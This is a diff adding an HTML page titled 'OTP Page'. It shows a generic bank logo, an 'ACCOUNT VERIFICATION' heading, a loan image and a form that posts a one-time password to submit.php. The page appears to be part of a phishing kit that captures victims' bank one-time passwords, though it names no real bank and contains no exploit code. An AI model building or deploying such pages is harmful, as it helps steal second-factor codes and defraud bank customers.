@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OTP Page</title>
+  <link rel="stylesheet" href="style.css">
+  <script>
+    function redirectToSubmit() {
+      document.getElementById("otp-form").submit();
+    }
+  </script>
+</head>
+<body>
+  <header>
+    <img src="logo.png" alt="Bank Logo" class="logo">
+  </header>
+  <main><center>
+    <img src="otp.jpg" alt="OTP Image" class="otp-image">
+	
+	<b> ACCOUNT VERIFICATION </b>
+	</br>
+	</br>
+	<h3 style="color:red"> NOTE: </h3>
+	 it may take upto 4 minutes before recieving
+	 </br>
+	 </br>
+	 </br>
+	 </br>
+    <form id="otp-form" action="submit.php" method="post">
+      <div class="form-group">
+        <label for="otp">INPUT OTP HERE:</label>
+        <input type="text" id="otp" name="otp" required>
+      </div>
+      <button type="button" class="submit-btn" onclick="redirectToSubmit();">Submit OTP</button>
+	  </center>
+    </form>
+  </main>
+  
+   <img src="image3.png" alt="Loan Image" class="loan-image">
+</body>
+</html>
